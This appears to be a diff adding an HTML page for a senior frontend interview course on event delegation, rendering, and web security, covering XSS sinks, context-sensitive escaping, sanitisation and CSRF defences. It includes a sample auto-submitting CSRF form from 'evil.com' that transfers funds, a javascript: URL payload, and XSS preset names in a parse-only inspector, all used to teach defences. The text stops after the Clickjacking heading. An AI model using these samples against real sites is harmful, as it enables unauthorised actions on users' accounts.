@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<base href="about:srcdoc">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Browser, Events & Security — a senior FE course</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0B1416;
+    --surface:#11201F;
+    --surface-2:#182D2B;
+    --border:#264240;
+    --border-soft:#1c3532;
+    --text:#E6F0EE;
+    --muted:#8AA6A2;
+    --faint:#5B7570;
+    /* semantic colours — each maps to a real concept */
+    --emerald:#F87171;  /* fulfilled / resolve / brand */
+    --rose:#FF7A8A;     /* rejected / errors */
+    --amber:#F3BA2F;    /* pending / caution */
+    --violet:#A78BFA;   /* the chain / continuations */
+    --cyan:#34D3E6;     /* microtask timing */
+    --green:#5FD68A;    /* console output */
+    --display:'Space Grotesk',sans-serif;
+    --body:'Inter',system-ui,sans-serif;
+    --mono:'JetBrains Mono',monospace;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{animation-duration:.001ms!important;transition-duration:.001ms!important}}
+  body{
+    background:var(--bg);color:var(--text);font-family:var(--body);
+    line-height:1.65;font-size:16px;-webkit-font-smoothing:antialiased;
+  }
+  ::selection{background:var(--emerald);color:#08110F}
+
+  /* ---------- layout ---------- */
+  .shell{display:grid;grid-template-columns:270px 1fr;min-height:100vh}
+  nav.side{
+    position:sticky;top:0;height:100vh;overflow-y:auto;
+    background:linear-gradient(180deg,#091210,#0B1416);
+    border-right:1px solid var(--border);padding:26px 18px 40px;
+  }
+  .brand{font-family:var(--display);font-weight:700;font-size:19px;letter-spacing:-.02em;line-height:1.25;margin-bottom:4px}
+  .brand em{color:var(--emerald);font-style:normal}
+  .brand-sub{font-family:var(--mono);font-size:11px;color:var(--faint);letter-spacing:.04em;text-transform:uppercase;margin-bottom:26px}
+  nav.side a{
+    display:flex;gap:10px;align-items:baseline;text-decoration:none;color:var(--muted);
+    font-size:13.5px;padding:8px 10px;border-radius:8px;margin-bottom:2px;transition:.15s;
+  }
+  nav.side a .n{font-family:var(--mono);font-size:11px;color:var(--faint);min-width:18px}
+  nav.side a:hover{background:var(--surface);color:var(--text)}
+  nav.side a.active{background:var(--surface-2);color:var(--text)}
+  nav.side a.active .n{color:var(--emerald)}
+
+  main{max-width:820px;margin:0 auto;padding:64px 40px 120px;width:100%}
+
+  /* ---------- hero ---------- */
+  .hero{margin-bottom:72px}
+  .eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--emerald);margin-bottom:18px}
+  h1{font-family:var(--display);font-weight:700;font-size:clamp(34px,6vw,54px);line-height:1.02;letter-spacing:-.03em;margin-bottom:20px}
+  h1 span{color:var(--emerald)}
+  .lede{font-size:19px;color:var(--muted);max-width:60ch}
+  .legend{display:flex;flex-wrap:wrap;gap:8px;margin-top:30px}
+  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:12px;
+    background:var(--surface);border:1px solid var(--border);border-radius:100px;padding:5px 12px 5px 10px;color:var(--muted)}
+  .dot{width:9px;height:9px;border-radius:50%;flex:none}
+  .d-pending{background:var(--amber)}.d-ful{background:var(--emerald)}.d-rej{background:var(--rose)}.d-chain{background:var(--violet)}
+
+  /* ---------- sections ---------- */
+  section{margin-bottom:76px;scroll-margin-top:24px}
+  .kicker{font-family:var(--mono);font-size:12px;color:var(--emerald);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:10px}
+  .kicker::before{content:"";width:22px;height:1px;background:var(--emerald);display:inline-block}
+  h2{font-family:var(--display);font-weight:600;font-size:31px;letter-spacing:-.02em;margin-bottom:18px;line-height:1.15}
+  h3{font-family:var(--display);font-weight:600;font-size:20px;margin:34px 0 12px;letter-spacing:-.01em}
+  p{margin-bottom:16px;color:#CFE0DC}
+  main p strong{color:var(--text);font-weight:600}
+  a.inline{color:var(--emerald);text-decoration:none;border-bottom:1px solid rgba(248,113,113,.3)}
+  ul.body,ol.body{margin:0 0 16px 20px;color:#CFE0DC}
+  ul.body li,ol.body li{margin-bottom:9px}
+  code.k{font-family:var(--mono);font-size:.88em;background:var(--surface-2);border:1px solid var(--border-soft);padding:1px 6px;border-radius:5px;color:#F9BDBD}
+
+  /* colour-coded key terms */
+  .t-pending{color:var(--amber);font-weight:600}
+  .t-ful{color:var(--emerald);font-weight:600}
+  .t-rej{color:var(--rose);font-weight:600}
+  .t-chain{color:var(--violet);font-weight:600}
+  .t-micro{color:var(--cyan);font-weight:600}
+
+  /* ---------- callouts ---------- */
+  .note{border-left:3px solid var(--emerald);background:linear-gradient(90deg,rgba(248,113,113,.07),transparent);
+    padding:14px 18px;border-radius:0 8px 8px 0;margin:22px 0;font-size:15px}
+  .note .lbl{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--emerald);display:block;margin-bottom:5px}
+  .note.warn{border-color:var(--rose);background:linear-gradient(90deg,rgba(255,122,138,.07),transparent)}
+  .note.warn .lbl{color:var(--rose)}
+  .note.gold{border-color:var(--amber);background:linear-gradient(90deg,rgba(243,186,47,.08),transparent)}
+  .note.gold .lbl{color:var(--amber)}
+
+  /* ---------- code blocks ---------- */
+  pre{background:#070E0D;border:1px solid var(--border);border-radius:12px;padding:18px 20px;overflow-x:auto;margin:18px 0;
+    font-family:var(--mono);font-size:13.5px;line-height:1.75;position:relative}
+  pre .cmt{color:var(--faint)}
+  pre .out{color:var(--green)}
+  pre .kw{color:var(--emerald)}
+  pre .err{color:var(--rose)}
+  .filelabel{font-family:var(--mono);font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.08em;margin:18px 0 -10px}
+
+  /* ---------- state diagram ---------- */
+  .states{display:flex;flex-wrap:wrap;gap:14px;margin:24px 0}
+  .statebox{flex:1;min-width:150px;background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:16px 18px}
+  .statebox .st-name{font-family:var(--mono);font-size:12px;letter-spacing:.05em;text-transform:uppercase;display:flex;align-items:center;gap:8px;margin-bottom:8px;font-weight:700}
+  .statebox.pending .st-name{color:var(--amber)}
+  .statebox.ful .st-name{color:var(--emerald)}
+  .statebox.rej .st-name{color:var(--rose)}
+  .statebox p{font-size:13.5px;margin:0;color:var(--muted)}
+
+  /* ---------- table ---------- */
+  .tbl{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px}
+  .tbl th,.tbl td{text-align:left;padding:11px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+  .tbl th{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:500}
+  .tbl td{color:#CFE0DC}
+  .tbl td:first-child{font-family:var(--mono);font-size:12.5px;color:var(--text);white-space:nowrap}
+
+  .diagram{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:24px;margin:24px 0}
+
+  /* ---------- predict / reveal ---------- */
+  .quizcard{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:18px 20px;margin:18px 0}
+  .quizcard .q{font-weight:600;color:var(--text);margin-bottom:6px}
+  .reveal-btn{font-family:var(--mono);font-size:12px;background:transparent;border:1px dashed var(--faint);color:var(--muted);
+    padding:7px 13px;border-radius:8px;cursor:pointer;margin-top:6px;transition:.15s}
+  .reveal-btn:hover{border-color:var(--emerald);color:var(--emerald)}
+  .answer{margin-top:14px;padding-top:14px;border-top:1px solid var(--border);display:none}
+  .answer.show{display:block;animation:pop .25s ease}
+  @keyframes pop{from{transform:scale(.98);opacity:0}to{transform:scale(1);opacity:1}}
+  .answer .out-line{font-family:var(--mono);font-size:13px;color:var(--green);background:#070E0D;border:1px solid var(--border-soft);border-radius:8px;padding:10px 12px;margin-bottom:12px}
+
+  /* ---------- Q&A bank ---------- */
+  .qtools{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:18px 0 20px}
+  .qtools .count{font-family:var(--mono);font-size:12px;color:var(--faint);margin-right:auto}
+  .qbtn{font-family:var(--mono);font-size:12px;font-weight:600;cursor:pointer;border:1px solid var(--emerald);color:var(--emerald);
+    background:transparent;padding:7px 13px;border-radius:8px;transition:.15s}
+  .qbtn:hover{background:var(--emerald);color:#08110F}
+  .fchip{font-family:var(--mono);font-size:11.5px;cursor:pointer;border:1px solid var(--border);background:var(--surface);color:var(--muted);
+    padding:5px 11px;border-radius:100px;transition:.15s}
+  .fchip:hover{border-color:var(--emerald);color:var(--emerald)}
+  .fchip.on{background:var(--text);color:#08110F;border-color:var(--text)}
+  .qcard{border:1px solid var(--border);border-radius:12px;background:var(--surface);margin-bottom:10px;overflow:hidden;transition:border-color .18s}
+  .qcard.open{border-color:var(--emerald)}
+  .qcard.hide{display:none}
+  .qhead{width:100%;text-align:left;cursor:pointer;border:0;background:none;color:var(--text);
+    display:flex;gap:12px;align-items:flex-start;padding:15px 16px;font-family:var(--body);font-size:14.5px;font-weight:500;line-height:1.45}
+  .qhead:hover{background:var(--surface-2)}
+  .qmark{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--emerald);flex:none;margin-top:1px;transition:transform .24s}
+  .qcard.open .qmark{transform:rotate(90deg)}
+  .qtopic{font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);flex:none;margin-top:3px;
+    border:1px solid var(--border);border-radius:5px;padding:1px 6px}
+  .qtext{flex:1}
+  .qbody{display:grid;grid-template-rows:0fr;transition:grid-template-rows .28s ease}
+  .qcard.open .qbody{grid-template-rows:1fr}
+  .qbody>.inner{overflow:hidden}
+  .ans{border-top:1px solid var(--border-soft);padding:14px 16px 16px 40px;font-size:14px;color:var(--muted)}
+  .ans code.k{color:#F9BDBD}
+
+  footer{border-top:1px solid var(--border);padding:34px 40px;text-align:center;color:var(--faint);font-size:13px;font-family:var(--mono)}
+
+  /* ---------- mobile ---------- */
+  .menu-btn{display:none}
+  @media(max-width:880px){
+    .shell{grid-template-columns:1fr}
+    nav.side{position:fixed;z-index:50;width:270px;transform:translateX(-100%);transition:transform .25s ease}
+    nav.side.open{transform:translateX(0)}
+    .menu-btn{display:flex;position:fixed;top:14px;right:14px;z-index:60;background:var(--emerald);color:#08110F;
+      border:none;width:44px;height:44px;border-radius:11px;font-size:20px;cursor:pointer;align-items:center;justify-content:center;font-family:var(--mono)}
+    main{padding:56px 22px 100px}
+    h1{font-size:38px}
+    .backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:40}
+    .backdrop.open{display:block}
+  }
+
+  /* ---------- injection inspector ---------- */
+  .lab{border:1px solid var(--border);border-radius:14px;background:var(--surface);margin:26px 0;overflow:hidden}
+  .lab-head{display:flex;flex-wrap:wrap;gap:10px 14px;align-items:center;justify-content:space-between;
+    padding:12px 16px;border-bottom:1px solid var(--border);background:var(--surface-2)}
+  .lab-title{font-family:var(--mono);font-size:11.5px;letter-spacing:.09em;text-transform:uppercase;color:var(--emerald);font-weight:700}
+  .lab-presets{display:flex;flex-wrap:wrap;gap:6px}
+  .lab-preset{font-family:var(--mono);font-size:11px;cursor:pointer;border:1px solid var(--border);background:var(--bg);
+    color:var(--muted);padding:4px 10px;border-radius:100px;transition:.15s}
+  .lab-preset:hover{border-color:var(--emerald);color:var(--emerald)}
+  .lab-preset.on{background:var(--emerald);border-color:var(--emerald);color:#08110F;font-weight:700}
+  .ctxrow{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin-top:12px}
+  .ctxrow .ctxlbl{font-family:var(--mono);font-size:10.5px;letter-spacing:.07em;text-transform:uppercase;color:var(--faint);margin-right:4px}
+  .tmpl{font-family:var(--mono);font-size:11.5px;color:var(--faint);margin-top:9px;word-break:break-all}
+  .tmpl b{color:var(--emerald);font-weight:500}
+  .lab-in{padding:14px 16px 4px}
+  .lab-in label{font-family:var(--mono);font-size:10.5px;letter-spacing:.07em;text-transform:uppercase;color:var(--faint);display:block;margin-bottom:6px}
+  .lab-in textarea{width:100%;min-height:64px;resize:vertical;font-family:var(--mono);font-size:12.5px;line-height:1.6;
+    background:#070E0D;color:var(--text);border:1px solid var(--border);border-radius:9px;padding:10px 12px}
+  .lab-in textarea:focus{outline:none;border-color:var(--emerald)}
+  .verdict{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11.5px;font-weight:700;
+    border-radius:100px;padding:5px 13px;margin:12px 16px 0;letter-spacing:.03em}
+  .verdict.safe{color:var(--green);border:1px solid rgba(95,214,138,.45);background:rgba(95,214,138,.08)}
+  .verdict.mid{color:var(--amber);border:1px solid rgba(243,186,47,.5);background:rgba(243,186,47,.09)}
+  .verdict.risk{color:var(--rose);border:1px solid rgba(255,122,138,.5);background:rgba(255,122,138,.09)}
+  .panes{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px 16px 16px}
+  @media(max-width:700px){.panes{grid-template-columns:1fr}}
+  .pane{border:1px solid var(--border-soft);border-radius:10px;background:#070E0D;overflow:hidden}
+  .pane h5{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;
+    color:var(--faint);padding:9px 12px;border-bottom:1px solid var(--border-soft);background:var(--surface)}
+  .pane .out{padding:10px 12px;font-family:var(--mono);font-size:12px;line-height:1.65;color:#CFE0DC;
+    white-space:pre-wrap;word-break:break-word;min-height:46px}
+  .pane.danger{border-color:rgba(255,122,138,.45)}
+  .pane.danger h5{color:var(--rose)}
+  .pane .out.good{color:var(--green)}
+  .pane .out.bad{color:#FFB3BC}
+  .labhint{font-family:var(--mono);font-size:10.5px;color:var(--faint);padding:0 16px 14px}
+
+  /* ---------- attack cards ---------- */
+  .atk{border:1px solid var(--border);border-left:3px solid var(--rose);border-radius:0 12px 12px 0;
+    background:var(--surface);padding:16px 18px;margin:18px 0}
+  .atk h4{font-family:var(--display);font-weight:600;font-size:16.5px;margin-bottom:4px;color:var(--text)}
+  .atk .atk-tag{font-family:var(--mono);font-size:10px;letter-spacing:.09em;text-transform:uppercase;color:var(--rose);margin-bottom:7px}
+  .atk p{font-size:14.5px;margin-bottom:10px}
+  .atk p:last-child{margin-bottom:0}
+  .atk .fix{font-size:14.5px;color:#CFE0DC;border-top:1px solid var(--border-soft);padding-top:10px;margin-top:11px}
+  .atk .fix b{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--green);
+    display:block;margin-bottom:4px;font-weight:600}
+  .atk pre{margin:10px 0;font-size:12.5px}
+  main{min-width:0}
+  .tbl.wrapc td:first-child{white-space:normal}
+  .tbl.wrapc td,.tbl.wrapc th{overflow-wrap:anywhere}
+  @media(max-width:700px){.tbl td:first-child{white-space:normal}.tbl td,.tbl th{overflow-wrap:anywhere}}
+  .lab pre{max-width:100%}
+</style>
+</head>
+<body>
+<button class="menu-btn" id="menuBtn" aria-label="Toggle navigation">≡</button>
+<div class="backdrop" id="backdrop"></div>
+<div class="shell">
+  <nav class="side" id="side">
+    <div class="brand">Browser &amp; <em>Security</em></div>
+    <div class="brand-sub">Senior FE · deep dive</div>
+    <a href="#intro"><span class="n">00</span> Scope</a>
+    <a href="#events"><span class="n">01</span> Event delegation</a>
+    <a href="#pixels"><span class="n">02</span> DOM to pixels</a>
+    <a href="#xss"><span class="n">03</span> XSS, in depth</a>
+    <a href="#csrf"><span class="n">04</span> CSRF</a>
+    <a href="#attacks"><span class="n">05</span> Attack catalogue</a>
+    <a href="#headers"><span class="n">06</span> Headers &amp; CSP</a>
+    <a href="#storage"><span class="n">07</span> Storage &amp; tokens</a>
+    <a href="#oauth"><span class="n">08</span> OAuth &amp; PKCE</a>
+    <a href="#drills"><span class="n">09</span> Drills</a>
+    <a href="#bank"><span class="n">10</span> Q&amp;A bank</a>
+  </nav>
+  <main>
+    <header class="hero">
+      <div class="eyebrow">Frontend interview prep</div>
+      <h1>The browser's <span>event &amp; trust</span> model.</h1>
+      <p class="lede">Event bubbling and delegation, how the DOM becomes pixels, and the security fundamentals a trading frontend can't get wrong — XSS and CSRF in depth, the dozen other attacks that reach the browser, the headers that stop them, where you keep a token &mdash; and how it got there, via OAuth code flow with PKCE.</p>
+      <div class="legend">
+        <span class="chip"><span class="dot d-chain"></span>Delegation</span>
+        <span class="chip"><span class="dot d-rej"></span>XSS</span>
+        <span class="chip"><span class="dot d-pending"></span>CSRF</span>
+        <span class="chip"><span class="dot d-ful"></span>Storage</span>
+        <span class="chip"><span class="dot d-ful"></span>OAuth / PKCE</span>
+        <span class="chip"><span class="dot" style="background:var(--cyan)"></span>Attack catalogue</span>
+      </div>
+    </header>
+    <section id="intro">
+      <div class="kicker">00 — What this covers</div>
+      <h2>Events, rendering, and trust</h2>
+      <p>HTTP methods, status codes, caching, CORS and TLS have their own tab in this deck. This guide covers the <strong>DOM event model</strong>, a brief note on <strong>how the browser paints</strong>, and the <strong>web-security</strong> essentials that matter double for a product handling money: XSS, CSRF, and safe token storage.</p>
+    </section>
+
+    <section id="events">
+      <div class="kicker">01 — One listener, many targets</div>
+      <h2>Event delegation</h2>
+      <h3>The three phases</h3>
+      <p>A dispatched event travels: <strong>capture</strong> (root &rarr; target), <strong>target</strong>, then <strong>bubble</strong> (target &rarr; root). Handlers run on the bubble phase by default; pass <code class="k">{ capture: true }</code> to listen on the way down. Most events bubble — a few don't (<code class="k">focus</code>, <code class="k">blur</code>, <code class="k">mouseenter</code>).</p>
+      <table class="tbl">
+        <tr><th>API</th><th>Does</th></tr>
+        <tr><td>event.stopPropagation()</td><td>stops the event travelling further up/down — other elements' handlers won't see it</td></tr>
+        <tr><td>event.preventDefault()</td><td>cancels the browser's default action (form submit, link navigation) — propagation continues</td></tr>
+        <tr><td>event.target</td><td>the element the event originated on</td></tr>
+        <tr><td>event.currentTarget</td><td>the element whose listener is currently running</td></tr>
+      </table>
+      <h3>Delegation</h3>
+      <pre><span class="cmt">// one listener on the parent handles all rows, incl. future ones</span>
+list.addEventListener('click', (e) =&gt; {
+  const row = e.target.closest('[data-id]');
+  if (row) select(row.dataset.id);
+});</pre>
+      <p>Because events bubble, you attach a <strong>single</strong> listener on a stable ancestor and read <code class="k">e.target</code> (often with <code class="k">.closest()</code>) to find what was clicked. Benefits: one listener instead of thousands, it works for <strong>dynamically added</strong> children automatically, and it uses far less memory. React uses exactly this idea — it attaches delegated listeners at the root and gives you a synthetic event.</p>
+    </section>
+
+    <section id="pixels">
+      <div class="kicker">02 — Briefly</div>
+      <h2>How the DOM becomes pixels</h2>
+      <p>HTML &rarr; DOM and CSS &rarr; CSSOM combine into a render tree, which is laid out (geometry), painted (pixels), and composited (GPU layers). CSS is render-blocking; <code class="k">transform</code>/<code class="k">opacity</code> can animate without layout/paint. Full detail lives in the <strong>Performance</strong> tab — worth cross-referencing when an interviewer bridges &ldquo;rendering&rdquo; and &ldquo;performance.&rdquo;</p>
+    </section>
+
+    <section id="xss">
+      <div class="kicker">03 — The one that undoes everything else</div>
+      <h2>XSS, in depth</h2>
+      <p>An attacker gets their JavaScript to run in <em>your</em> origin, where it can read the DOM, non-<code class="k">HttpOnly</code> cookies and <code class="k">localStorage</code>, call your API with the user's session, and rewrite the page. On a trading frontend that means reading positions and <strong>placing orders as the user</strong> — which is why XSS outranks everything else in this guide.</p>
+
+      <h3>The three types — by where the payload lives</h3>
+      <table class="tbl wrapc">
+        <tr><th>Type</th><th>Where the payload lives</th><th>Typical shape</th></tr>
+        <tr><td>Stored</td><td>Your database — served to every viewer</td><td>a malicious chat message, display name, or instrument note</td></tr>
+        <tr><td>Reflected</td><td>The request — echoed straight back in the response</td><td><code class="k">/search?q=&lt;payload&gt;</code> rendered into the results heading</td></tr>
+        <tr><td>DOM-based</td><td>Nowhere on the server — client code reads a source and writes a sink</td><td><code class="k">el.innerHTML = location.hash.slice(1)</code></td></tr>
+      </table>
+      <p><strong>DOM-based XSS is the frontend-owned one.</strong> The server response is identical for every user and a server-side scanner sees nothing; the whole bug lives in your bundle. That's the type an interviewer expects a senior frontend engineer to reason about unprompted.</p>
+
+      <h3>Sources and sinks</h3>
+      <p>A DOM XSS is a <strong>source</strong> (attacker-controlled input) reaching a <strong>sink</strong> (an API that turns strings into code or markup). Learn the sinks; the sources are just &ldquo;anything from the URL, the network, or another window&rdquo;.</p>
+      <table class="tbl wrapc">
+        <tr><th>Sink</th><th>Why it's dangerous</th></tr>
+        <tr><td>innerHTML / outerHTML</td><td>parses the string as HTML — <code class="k">&lt;img onerror&gt;</code> and <code class="k">&lt;svg onload&gt;</code> fire</td></tr>
+        <tr><td>insertAdjacentHTML</td><td>same parser, same risk</td></tr>
+        <tr><td>document.write</td><td>parses into the document mid-load; can inject a <code class="k">&lt;script&gt;</code> that <em>does</em> run</td></tr>
+        <tr><td>eval / new Function</td><td>executes the string as JavaScript, full stop</td></tr>
+        <tr><td>setTimeout('…')</td><td>the string form is an implicit <code class="k">eval</code></td></tr>
+        <tr><td>location / href / src</td><td>a <code class="k">javascript:</code> URL executes on navigation or click</td></tr>
+        <tr><td>iframe srcdoc</td><td>a whole document, parsed and run</td></tr>
+        <tr><td>dangerouslySetInnerHTML</td><td>React's explicit opt-out of escaping</td></tr>
+        <tr><td>v-html / bypassSecurityTrustHtml</td><td>the Vue and Angular equivalents</td></tr>
+      </table>
+      <p>The safe counterparts are boring on purpose: <code class="k">textContent</code>, <code class="k">setAttribute</code> with a validated value, <code class="k">createElement</code> + <code class="k">append</code>, and in React just <code class="k">{value}</code>.</p>
+
+      <h3>Escaping is context-sensitive</h3>
+      <p>&ldquo;Escape the input&rdquo; is not one operation — the correct encoding depends on <em>where in the document</em> the value lands. This is the answer that separates a rehearsed reply from a real one:</p>
+      <table class="tbl wrapc">
+        <tr><th>Context</th><th>What breaks out</th><th>Correct handling</th></tr>
+        <tr><td>HTML text</td><td><code class="k">&lt;</code> <code class="k">&amp;</code></td><td>HTML-entity encode</td></tr>
+        <tr><td>Attribute value</td><td>the quote character — or no quotes at all</td><td>always quote, then entity-encode <code class="k">"</code> <code class="k">'</code></td></tr>
+        <tr><td>URL / href</td><td><code class="k">javascript:</code>, <code class="k">data:</code></td><td>allowlist the scheme (<code class="k">http</code>/<code class="k">https</code>/<code class="k">mailto</code>), then URL-encode</td></tr>
+        <tr><td>Inside &lt;script&gt;</td><td><code class="k">&lt;/script&gt;</code> and quote breakout</td><td>don't — pass data via <code class="k">JSON.parse</code> of a <code class="k">&lt;script type="application/json"&gt;</code> block</td></tr>
+        <tr><td>CSS value</td><td><code class="k">url()</code>, <code class="k">expression()</code></td><td>never interpolate untrusted values into styles</td></tr>
+      </table>
+      <div class="note warn"><span class="lbl">React escapes text, not URLs</span><code class="k">&lt;a href={userUrl}&gt;</code> is <strong>not</strong> protected by JSX auto-escaping. If <code class="k">userUrl</code> is <code class="k">javascript:fetch('/api/orders',…)</code>, clicking the link runs it in your origin. Validate the scheme yourself: <code class="k">new URL(u, location.origin)</code> and reject anything that isn't <code class="k">http:</code> or <code class="k">https:</code>.</div>
+
+      <h3>Try it — the injection inspector</h3>
+      <p>Paste a payload and see what the HTML parser actually builds from it. Nothing here executes: the input is parsed with <code class="k">DOMParser</code>, which builds a detached document without running scripts or fetching resources — the same reason it's a useful tool for reasoning about sanitizer output.</p>
+
+      <div class="lab" id="xssLab">
+        <div class="lab-head">
+          <span class="lab-title">Injection inspector</span>
+          <div class="lab-presets">
+            <button class="lab-preset" data-xp="plain">Normal comment</button>
+            <button class="lab-preset" data-xp="img">img onerror</button>
+            <button class="lab-preset" data-xp="svg">svg onload</button>
+            <button class="lab-preset" data-xp="script">script tag</button>
+            <button class="lab-preset" data-xp="attr">quote breakout</button>
+            <button class="lab-preset" data-xp="url">javascript: URL</button>
+          </div>
+        </div>
+        <div class="lab-in">
+          <label for="xssIn">Untrusted input</label>
+          <textarea id="xssIn" spellcheck="false" autocapitalize="off" autocorrect="off"></textarea>
+          <div class="ctxrow">
+            <span class="ctxlbl">Interpolated into</span>
+            <button class="lab-preset on" data-ctx="body">HTML text</button>
+            <button class="lab-preset" data-ctx="attr">an attribute value</button>
+            <button class="lab-preset" data-ctx="href">an href</button>
+          </div>
+          <div class="tmpl" id="xssTmpl"></div>
+        </div>
+        <div id="xssVerdict" class="verdict safe">inert</div>
+        <div class="panes">
+          <div class="pane"><h5>Rendered as text — textContent, or JSX {value}</h5><div class="out good" id="xssText"></div></div>
+          <div class="pane danger"><h5>Parsed as HTML — what the browser builds</h5><div class="out" id="xssTree"></div></div>
+          <div class="pane"><h5>HTML-entity encoded — what escaping produces</h5><div class="out" id="xssEsc"></div></div>
+          <div class="pane"><h5>Executable vectors found</h5><div class="out" id="xssVectors"></div></div>
+        </div>
+        <div class="labhint">A bare &lt;script&gt; inserted via innerHTML is parsed but <strong>not</strong> executed — which is exactly why real payloads use event-handler attributes instead. The inspector flags both.</div>
+      </div>
+
+      <h3>Sanitizing, when you must render HTML</h3>
+      <p>Rich text from users has to become markup somewhere. The rules:</p>
+      <ul class="body">
+        <li><strong>Allowlist, never denylist.</strong> Stripping <code class="k">&lt;script&gt;</code> and <code class="k">onerror</code> is a game you lose; permit a known set of tags and attributes and drop everything else.</li>
+        <li><strong>Use a maintained library</strong> — DOMPurify is the default answer. Sanitize as late as possible, ideally at render, because sanitizing on write and storing the result means a future parser bug reopens every stored record.</li>
+        <li><strong>Watch mutation XSS (mXSS).</strong> Markup that is inert when sanitized can become live after the browser <em>re-parses</em> it — <code class="k">innerHTML</code> round-trips normalise the DOM and can resurrect a payload. It's the reason to sanitize with a real parser rather than regexes, and to keep the library current.</li>
+        <li><strong>Trusted Types</strong> (<code class="k">require-trusted-types-for 'script'</code>) makes this structural on Chromium: assigning a plain string to <code class="k">innerHTML</code> throws, so every write must pass through a policy you wrote. It converts DOM XSS from a code-review problem into a runtime guarantee.</li>
+      </ul>
+      <pre><span class="cmt">// the shape of a Trusted Types policy</span>
+const policy = trustedTypes.createPolicy('app-html', {
+  createHTML: (s) =&gt; DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: false })
+});
+el.innerHTML = policy.createHTML(userMarkup);   <span class="cmt">// the only way through</span></pre>
+    </section>
+
+    <section id="csrf">
+      <div class="kicker">04 — Riding the user's session</div>
+      <h2>CSRF</h2>
+      <p>A malicious site causes the victim's browser to send an <em>authenticated</em> request to your site, relying on cookies being attached automatically. The attacker <strong>cannot read the response</strong> — the same-origin policy still holds — they just trigger the side effect. Which is plenty when the side effect is &ldquo;transfer funds&rdquo;.</p>
+      <pre><span class="cmt">// evil.com — no user interaction beyond visiting the page</span>
+&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input name="to"     value="attacker"&gt;
+  &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;f.submit()&lt;/script&gt;   <span class="cmt">// the browser attaches bank.example's cookies</span></pre>
+      <ul class="body">
+        <li><strong>Anti-CSRF tokens — the primary defense.</strong> A server-validated token a cross-site attacker can't read (same-origin policy): a synchronizer token if you're stateful, a <em>signed</em> double-submit cookie if not.</li>
+        <li><strong>SameSite cookies — defense in depth, not the whole answer.</strong> <code class="k">Strict</code> blocks the cookie on all cross-site requests; <code class="k">Lax</code> blocks cross-site subrequests and form POSTs but still sends on top-level GET navigations. Three caveats interviewers probe: only Chromium <em>defaults</em> to Lax (Firefox and Safari don't); that implicit default still allows cross-site POSTs for cookies under ~2 minutes old; and SameSite is scoped to the <em>site</em>, so any sibling subdomain counts as same-site.</li>
+        <li><strong>Verify <code class="k">Origin</code> / <code class="k">Sec-Fetch-Site</code></strong> on every state-changing request (<code class="k">Referer</code> as the legacy fallback). <code class="k">Sec-Fetch-Site: cross-site</code> on a POST is a straightforward reject.</li>
+        <li><strong>Never let GET change state.</strong> A state-changing GET is reachable from an <code class="k">&lt;img src&gt;</code> and slips past <code class="k">SameSite=Lax</code> on a top-level navigation.</li>
+      </ul>
+      <div class="note"><span class="lbl">Why a JSON API is partly self-defending</span>A cross-origin <code class="k">fetch</code> with <code class="k">Content-Type: application/json</code> or a custom header like <code class="k">X-Requested-With</code> is not a &ldquo;simple request&rdquo;, so the browser sends a <strong>preflight</strong> first — and your server simply doesn't approve it. An HTML form can't produce those headers (it's limited to three <code class="k">Content-Type</code> values), so form-based CSRF dies. It is <em>not</em> sufficient on its own: reject requests whose body parses as JSON but arrived as <code class="k">text/plain</code>, and keep the token or Origin check.</div>
+      <div class="note warn"><span class="lbl">Two traps in the double-submit pattern</span>(1) An <em>unsigned</em> double-submit cookie fails if any subdomain — or a subdomain takeover — can set cookies on the parent domain, because the attacker then controls both halves of the comparison. Sign or HMAC the token to the session. (2) <strong>CORS is not a CSRF defense.</strong> A restrictive <code class="k">Access-Control-Allow-Origin</code> stops the attacker <em>reading</em> the response; the request still arrives and still executes.</div>
+      <div class="note gold"><span class="lbl">Login CSRF</span>The overlooked variant: the attacker forges a login as <em>their own</em> account, so the victim then shops, saves a card, or places orders inside the attacker's session — and the attacker reads the history later. Protect the login form with a CSRF token too, and regenerate the session id on authentication.</div>
+    </section>
+
+    <section id="attacks">
+      <div class="kicker">05 — The rest of the surface</div>
+      <h2>The attack catalogue</h2>
+      <p>XSS and CSRF are the two you must know cold. These are the ones that separate &ldquo;revised the checklist&rdquo; from &ldquo;has shipped a frontend that holds money&rdquo;. Each has a shape and a fix.</p>
+
+      <div class="atk">
+        <div class="atk-tag">UI redressing</div>
+        <h4>Clickjacking</h4>
